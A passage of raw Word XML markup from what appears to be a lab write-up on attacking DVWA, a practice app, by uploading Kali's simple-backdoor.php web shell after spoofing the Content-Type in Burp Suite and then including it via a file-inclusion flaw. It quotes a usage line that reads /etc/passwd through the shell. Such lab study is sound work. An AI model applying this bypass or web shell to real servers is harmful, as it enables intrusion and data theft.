        <w:t>included in Kali’s collection of web</w:t>
      </w:r>
      <w:r w:rsidR="00ED0E81">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="000329B4">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>shells</w:t>
      </w:r>
      <w:r w:rsidR="00335CC1">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> in the /usr/share/webshells directory will be used for this </w:t>
      </w:r>
      <w:r w:rsidR="00B25AE6">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>demonstration</w:t>
      </w:r>
      <w:r w:rsidR="00BD468C">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>[Figure 2.2]</w:t>
      </w:r>
      <w:r w:rsidR="00025234">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EF08BA4" w14:textId="3ACABE7E" w:rsidR="00B25AE6" w:rsidRDefault="00B25AE6" w:rsidP="005A0F07">
      <w:pPr>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:iCs/>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="0EFAB4BA" wp14:editId="4454306C">
            <wp:extent cx="6248400" cy="385508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90412" cy="3881005"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="0161CDB6" w14:textId="4C9B9600" w:rsidR="00B25AE6" w:rsidRPr="00E34B94" w:rsidRDefault="00B25AE6" w:rsidP="00B25AE6">
      <w:pPr>
        <w:pStyle w:val="Caption"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:iCs w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E34B94">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Figure</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 2</w:t>
      </w:r>
      <w:r w:rsidRPr="00E34B94">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>2</w:t>
      </w:r>
      <w:r w:rsidRPr="00E34B94">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>simple-backdoor.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72EE4B17" w14:textId="77777777" w:rsidR="00B25AE6" w:rsidRDefault="00B25AE6" w:rsidP="005A0F07">
      <w:pPr>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5F22E219" w14:textId="21D3FCED" w:rsidR="00D82413" w:rsidRDefault="00720429" w:rsidP="005A0F07">
      <w:pPr>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r w:rsidR="00BD468C">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>DVWA</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00BB11CA">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>website</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00335CC1">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve">employs validation </w:t>
      </w:r>
      <w:r w:rsidR="00816979">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve">checks </w:t>
      </w:r>
      <w:r w:rsidR="00335CC1" w:rsidRPr="00C359A9">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>o</w:t>
      </w:r>
      <w:r w:rsidR="003916B4">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r w:rsidR="00335CC1" w:rsidRPr="00C359A9">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="003916B4">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>files</w:t>
      </w:r>
      <w:r w:rsidR="00816979">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00B25AE6">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>ensuring</w:t>
      </w:r>
      <w:r w:rsidR="00816979">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> the </w:t>
      </w:r>
      <w:r w:rsidR="003916B4">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve">correct </w:t>
      </w:r>
      <w:r w:rsidR="00335CC1">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve">file-type </w:t>
      </w:r>
      <w:r w:rsidR="00BB11CA">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve">of files </w:t>
      </w:r>
      <w:r w:rsidR="003916B4">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>accepted for</w:t>
      </w:r>
      <w:r w:rsidR="00BB11CA">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> upload to the </w:t>
      </w:r>
      <w:r w:rsidR="005537BE">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>website[Figure 2.</w:t>
      </w:r>
      <w:r w:rsidR="003916B4">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>3</w:t>
      </w:r>
      <w:r w:rsidR="005537BE">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>]</w:t>
      </w:r>
      <w:r w:rsidR="00BB11CA">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="005537BE">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="517C46B7" w14:textId="77777777" w:rsidR="00B228C6" w:rsidRDefault="00B228C6" w:rsidP="005A0F07">
      <w:pPr>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7CF5A080" w14:textId="6FEBB943" w:rsidR="00D82413" w:rsidRDefault="00B228C6" w:rsidP="005A0F07">
      <w:pPr>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:iCs/>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="412F4576" wp14:editId="607AB147">
            <wp:extent cx="6167520" cy="4298574"/>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6167520" cy="4298574"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DBD1915" w14:textId="391CA6C3" w:rsidR="00B228C6" w:rsidRPr="00E34B94" w:rsidRDefault="00B228C6" w:rsidP="00B228C6">
      <w:pPr>
        <w:pStyle w:val="Caption"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:iCs w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E34B94">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Figure</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 2</w:t>
      </w:r>
      <w:r w:rsidRPr="00E34B94">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="003916B4">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>3</w:t>
      </w:r>
      <w:r w:rsidRPr="00E34B94">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>DVWA Webpage Source Code Showing Check on File Extension</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7456FC94" w14:textId="405566FD" w:rsidR="00B228C6" w:rsidRDefault="005537BE" w:rsidP="005A0F07">
      <w:pPr>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve">So, </w:t>
      </w:r>
      <w:r w:rsidR="00BD468C">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve">uploading a file with </w:t>
      </w:r>
      <w:r w:rsidR="00ED0E81">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve">a </w:t>
      </w:r>
      <w:r w:rsidR="00BD468C">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>.php</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00335CC1">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>file name</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> fails</w:t>
      </w:r>
      <w:r w:rsidR="00335CC1">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>[</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>Figure 2.</w:t>
      </w:r>
      <w:r w:rsidR="00ED0E81">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>4</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>]</w:t>
      </w:r>
      <w:r w:rsidR="00BD468C">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FCC2135" w14:textId="77777777" w:rsidR="00B228C6" w:rsidRDefault="00B228C6" w:rsidP="005A0F07">
      <w:pPr>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1F59827E" w14:textId="745FDB7F" w:rsidR="005537BE" w:rsidRDefault="00B228C6" w:rsidP="005A0F07">
      <w:pPr>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:iCs/>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="1C74965E" wp14:editId="6FDA051C">
            <wp:extent cx="6248400" cy="34391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6257833" cy="3444352"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
      <w:r w:rsidR="00BD468C">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41BFF17D" w14:textId="2F466028" w:rsidR="00B228C6" w:rsidRPr="00E34B94" w:rsidRDefault="00B228C6" w:rsidP="00B228C6">
      <w:pPr>
        <w:pStyle w:val="Caption"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:iCs w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E34B94">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Figure</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 2</w:t>
      </w:r>
      <w:r w:rsidRPr="00E34B94">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="00ED0E81">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>4</w:t>
      </w:r>
      <w:r w:rsidRPr="00E34B94">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>DVWA File Upload Error Message</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18D07DBC" w14:textId="77777777" w:rsidR="00335CC1" w:rsidRDefault="00335CC1" w:rsidP="00C359A9">
      <w:pPr>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5665EF16" w14:textId="6CF1AB0A" w:rsidR="002018C2" w:rsidRDefault="00335CC1" w:rsidP="00C359A9">
      <w:pPr>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>To</w:t>
      </w:r>
      <w:r w:rsidR="00C359A9" w:rsidRPr="00C359A9">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> bypass this protection</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve">, one easy way to </w:t>
      </w:r>
      <w:r w:rsidR="00C359A9" w:rsidRPr="00C359A9">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve">upload </w:t>
      </w:r>
      <w:r w:rsidR="00206B1A">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>the</w:t>
      </w:r>
      <w:r w:rsidR="00C359A9" w:rsidRPr="00C359A9">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00206B1A">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve">file </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
        </w:rPr>
        <w:t>simple-backdoor</w:t>
      </w:r>
      <w:r w:rsidR="00C359A9" w:rsidRPr="00206B1A">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="00206B1A" w:rsidRPr="00206B1A">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
        </w:rPr>
        <w:t>php</w:t>
      </w:r>
      <w:r w:rsidR="00206B1A">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00C359A9" w:rsidRPr="00C359A9">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve">is to rename </w:t>
      </w:r>
      <w:r w:rsidR="00206B1A">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>the</w:t>
      </w:r>
      <w:r w:rsidR="00C359A9" w:rsidRPr="00C359A9">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> PHP file with a valid extension. </w:t>
      </w:r>
      <w:r w:rsidR="00B25AE6">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>This, however,</w:t>
      </w:r>
      <w:r w:rsidR="00C359A9" w:rsidRPr="00C359A9">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00B25AE6">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>will</w:t>
      </w:r>
      <w:r w:rsidR="00C359A9" w:rsidRPr="00C359A9">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> cause the server and browser to treat </w:t>
      </w:r>
      <w:r w:rsidR="00206B1A">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>the file</w:t>
      </w:r>
      <w:r w:rsidR="00C359A9" w:rsidRPr="00C359A9">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> like an image</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>, meaning the</w:t>
      </w:r>
      <w:r w:rsidR="00C359A9" w:rsidRPr="00C359A9">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> code wouldn't execute. </w:t>
      </w:r>
      <w:r w:rsidR="00B25AE6">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>M</w:t>
      </w:r>
      <w:r w:rsidR="00C359A9" w:rsidRPr="00C359A9">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>odifying the request's parameters</w:t>
      </w:r>
      <w:r w:rsidR="00206B1A">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> using</w:t>
      </w:r>
      <w:r w:rsidR="00C359A9" w:rsidRPr="00C359A9">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> Burp Suite as an intercepting proxy</w:t>
      </w:r>
      <w:r w:rsidR="00B25AE6">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> i</w:t>
      </w:r>
      <w:r w:rsidR="00B25AE6" w:rsidRPr="00C359A9">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>nstead</w:t>
      </w:r>
      <w:r w:rsidR="00CA1DA2">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
      <w:r w:rsidR="00206B1A">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00206B1A" w:rsidRPr="00C359A9">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>will work around this protection</w:t>
      </w:r>
      <w:r w:rsidR="00206B1A">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>[</w:t>
      </w:r>
      <w:r w:rsidR="005537BE">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>Figure 2.</w:t>
      </w:r>
      <w:r w:rsidR="00ED0E81">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>5</w:t>
      </w:r>
      <w:r w:rsidR="005537BE">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>]</w:t>
      </w:r>
      <w:r w:rsidR="002018C2">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DE1569A" w14:textId="6A68BD53" w:rsidR="002018C2" w:rsidRDefault="002018C2" w:rsidP="00C359A9">
      <w:pPr>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:iCs/>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="4F340F2A" wp14:editId="07012500">
            <wp:extent cx="6372225" cy="34382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93142" cy="3449537"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E572D8A" w14:textId="1E01C3AB" w:rsidR="002018C2" w:rsidRPr="00E34B94" w:rsidRDefault="002018C2" w:rsidP="002018C2">
      <w:pPr>
        <w:pStyle w:val="Caption"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:iCs w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E34B94">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Figure</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 2.</w:t>
      </w:r>
      <w:r w:rsidR="00ED0E81">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>5</w:t>
      </w:r>
      <w:r w:rsidRPr="00E34B94">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>DVWA File Upload Error Message</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="346D5032" w14:textId="746D0BC9" w:rsidR="002018C2" w:rsidRDefault="00CA1DA2" w:rsidP="005A0F07">
      <w:pPr>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>On intercept, it is noted that t</w:t>
      </w:r>
      <w:r w:rsidRPr="00CA1DA2">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00CA1DA2">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>Content-Type header in the second part</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> says </w:t>
      </w:r>
      <w:r w:rsidRPr="00CA1DA2">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>application/x-php, which tells the server the file is a PHP script.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> Modifying this value to image/jpeg and submitting the request packets produces a successful upload</w:t>
      </w:r>
      <w:r w:rsidRPr="00CA1DA2">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00102114">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>[Figure 2</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="00ED0E81">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>6</w:t>
      </w:r>
      <w:r w:rsidR="00102114">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>]</w:t>
      </w:r>
      <w:r w:rsidR="00B73721" w:rsidRPr="00B73721">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="614DA1A4" w14:textId="77777777" w:rsidR="00840C6A" w:rsidRDefault="00840C6A" w:rsidP="005A0F07">
      <w:pPr>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0100A718" w14:textId="3B8E6E63" w:rsidR="002018C2" w:rsidRDefault="002018C2" w:rsidP="005A0F07">
      <w:pPr>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:iCs/>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="622D9894" wp14:editId="2EAC176A">
            <wp:extent cx="669036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97141" cy="3442010"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EE7FF5E" w14:textId="501E4D81" w:rsidR="002018C2" w:rsidRPr="00E34B94" w:rsidRDefault="002018C2" w:rsidP="002018C2">
      <w:pPr>
        <w:pStyle w:val="Caption"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:iCs w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E34B94">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Figure</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 2</w:t>
      </w:r>
      <w:r w:rsidR="00ED0E81">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.6</w:t>
      </w:r>
      <w:r w:rsidRPr="00E34B94">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>DVWA File Upload Error Message</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="571745EF" w14:textId="77777777" w:rsidR="00CA1DA2" w:rsidRDefault="00CA1DA2" w:rsidP="005A0F07">
      <w:pPr>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0695FD97" w14:textId="004A0021" w:rsidR="005A0F07" w:rsidRDefault="002018C2" w:rsidP="005A0F07">
      <w:pPr>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>The</w:t>
      </w:r>
      <w:r w:rsidR="00976823">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00C32AA3">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
        </w:rPr>
        <w:t>simple-backdoor</w:t>
      </w:r>
      <w:r w:rsidR="00976823" w:rsidRPr="00976823">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
        </w:rPr>
        <w:t>.php</w:t>
      </w:r>
      <w:r w:rsidR="00976823">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> file can then be used to execute system commands on the server. Returning to DVWA’s File Inclusion page and using the </w:t>
      </w:r>
      <w:r w:rsidR="00976823" w:rsidRPr="00976823">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
        </w:rPr>
        <w:t>page</w:t>
      </w:r>
      <w:r w:rsidR="00976823">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> parameter to include </w:t>
      </w:r>
      <w:r w:rsidR="00C32AA3">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
        </w:rPr>
        <w:t>simple-backdoor</w:t>
      </w:r>
      <w:r w:rsidR="00976823" w:rsidRPr="00976823">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:i/>
        </w:rPr>
        <w:t>.php</w:t>
      </w:r>
      <w:r w:rsidR="00976823">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> loads the malicious code and displays the “</w:t>
      </w:r>
      <w:r w:rsidR="00C32AA3">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>Usage: http://target.com/simple-backdoor.php?cmd=cat+etc/passwd</w:t>
      </w:r>
      <w:r w:rsidR="00976823">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>” text[Figure 2.</w:t>
      </w:r>
      <w:r w:rsidR="00ED0E81">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>7</w:t>
      </w:r>
      <w:r w:rsidR="00976823">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>]</w:t>
      </w:r>
